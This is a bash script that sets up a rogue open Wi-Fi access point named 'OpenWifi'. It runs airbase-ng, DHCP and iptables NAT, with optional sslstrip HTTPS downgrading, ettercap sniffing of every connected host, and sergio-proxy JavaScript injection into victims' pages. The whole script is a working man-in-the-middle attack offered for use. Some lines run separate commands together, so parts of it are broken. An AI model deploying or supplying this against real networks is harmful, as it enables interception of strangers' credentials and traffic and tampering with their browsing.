#!/bin/bash
############# Configuration constants ###########
LOGS_PATH="/home/me/tests/fakewifilogs/$(date '+%Y-%m-%d_%H-%M')"
OUTPUT_INTERFACE="wlan0"
ROGUE_AP_INTERFACE="wlan1"
ROGUE_AP_CHANNEL=6
ROGUE_AP_SSID="OpenWifi"
DHCPD_CONF_FILE="/etc/dhcp/dhcpd_ap.conf"
USE_SSLTRIP="no"
USE_ETTERCAP="yes"
USE_SERGIO="no" # Note: incompatible with USE_SSLSTRIP (also launches its own SSL strip tool) ###############################################

if [ "$1" == "stop" ];then
    echo "Killing Airbase-ng..."
    pkill airbase-ng
    sleep 3;
    echo "Killing DHCP..."
    pkill dhcpd	rm /var/run/dhcpd.pid
    sleep 3;
    echo "Flushing iptables"
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain	iptables --table nat --delete-chain

    if [ "$USE_SSLTRIP" == "yes" ]; then
        echo "killing sslstrip"
        killall sslstrip
    fi

    if [ "$USE_ETTERCAP" == "yes" ]; then
        echo "Kill all ettercap"
        killall -9 ettercap
    fi

    if [ "$USE_SERGIO" == "yes" ]; then
        echo "Kill sergio proxy"
        pkill -9 -f sergio-proxy
    fi

    echo "disabling IP Forwarding"
    echo "0" > /proc/sys/net/ipv4/ip_forward
    echo "Stop airmon-ng on mon0"
    airmon-ng stop mon0
elif [ "$1" == "start" ]; then
    echo "Tools output stored in ${LOGS_PATH}"
    mkdir -p "${LOGS_PATH}"
    echo "Putting card in monitor mode"
    airmon-ng start $ROGUE_AP_INTERFACE
    sleep 5;
    echo "Starting Fake AP..."
    airbase-ng -e "$ROGUE_AP_SSID" -c $ROGUE_AP_CHANNEL mon0 &
    sleep 5;
    echo "Configuring interface at0 according to dhcpd config"
    ifconfig at0 up	ifconfig at0 192.168.3.1 netmask 255.255.255.0
    echo "Adding a route"
    route add -net 192.168.3.0 netmask 255.255.255.0 gw 192.168.3.1	sleep 5;
    echo "configuring iptables"
    iptables -P FORWARD ACCEPT
    iptables -t nat -A POSTROUTING -o $OUTPUT_INTERFACE -j MASQUERADE

    if [ "$USE_SSLTRIP" == "yes" ]; then
        echo "setting up sslstrip interception"
        iptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 15000
        echo "SSLStrip running... "
        sslstrip -w ${LOGS_PATH}/SSLStrip_log.txt -a -l 15000 -f &
        sleep 2;
    fi

    echo "clearing lease table"
    echo > '/var/lib/dhcp/dhcpd.leases'
    cp ./dhcpd.conf $DHCPD_CONF_FILE
    echo "starting new DHCPD server"
    ln -s /var/run/dhcp-server/dhcpd.pid /var/run/dhcpd.pid
    dhcpd -d -f -cf "$DHCPD_CONF_FILE" at0 &
    sleep 5;

    if [ "$USE_ETTERCAP" == "yes" ]; then
        echo "Launching ettercap, spy all hosts on the at0 interface's subnet"
        xterm -bg black -fg blue -e ettercap --silent -T -q -p --log-msg ${LOGS_PATH}/ettercap.log -i at0 // // &
        sleep 8
    fi

    if [ "$USE_SERGIO" == "yes" ]; then
        iptables -t nat -A PREROUTING -p tcp -i at0 --destination-port 80 -j REDIRECT --to-port 15000 # Redirection de http vers port 15000
        echo "Starting segio proxy to inject javascript"
        /opt/sergio-proxy/sergio-proxy.py -l 15000 --inject  --html-url "http://192.168.3.1/index" -w ${LOGS_PATH}/SSLStrip_log.txt -a -k  & #  --count-limit 2
    fi
    echo "Enable IP Forwarding"
    echo "1" > /proc/sys/net/ipv4/ip_forward
else
    echo "usage: ./rogueAP.sh stop|start"
fi
